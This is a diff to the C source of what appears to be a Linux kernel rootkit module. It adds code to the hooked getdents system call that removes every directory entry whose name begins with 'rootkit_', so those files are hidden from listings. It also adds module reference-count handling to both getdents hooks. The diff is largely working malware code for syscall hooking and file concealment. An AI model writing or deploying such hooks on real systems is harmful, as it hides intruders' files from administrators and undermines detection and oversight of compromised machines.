@@ -29,6 +29,16 @@
 #endif
 
 
+struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+                       /* length is actually (d_reclen - 2 -
+                          offsetof(struct linux_dirent, d_name) */
+};
+
+
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
@@ -72,10 +82,39 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
 }
 
 asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+    struct linux_dirent __user *cur_dirent;
     ssize_t result;
-    printk(KERN_INFO "our very own hooked_getdents\n");
+    int bpos;
+    char hidename[] = "rootkit_";
+    unsigned short cur_reclen;
+
+    OUR_TRY_MODULE_GET;
+
     result = original_getdents(fd, dirent, count);
+    OUR_DEBUG("----------------- Here are the files ------------------------------------");
+    cur_dirent = dirent;
+
+    for (bpos=0; bpos < result;){
+        cur_dirent = (struct linux_dirent*)((char *)dirent + bpos);
+
+        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
+        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
+            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
+            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
+            cur_reclen = cur_dirent->d_reclen;
+            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
+            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
+            result -= cur_reclen;
+            //printk(KERN_INFO "new result = %d\n", result);
+        } else {
+            bpos += cur_dirent->d_reclen;
+        }
+    }
+
+    OUR_DEBUG("----------------- End of file list ------------------------------------");
+    OUR_MODULE_PUT
     return result;
+
 }
 
 asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
@@ -84,6 +123,8 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
     int bpos;
     char hidename[] = "rootkit_";
     unsigned short cur_reclen;
+
+    OUR_TRY_MODULE_GET;
 
     result = original_getdents64(fd, dirent, count);
     OUR_DEBUG("----------------- Here are the files ------------------------------------");
@@ -107,6 +148,7 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
     }
 
     OUR_DEBUG("----------------- End of file list ------------------------------------");
+    OUR_MODULE_PUT
     return result;
 
 
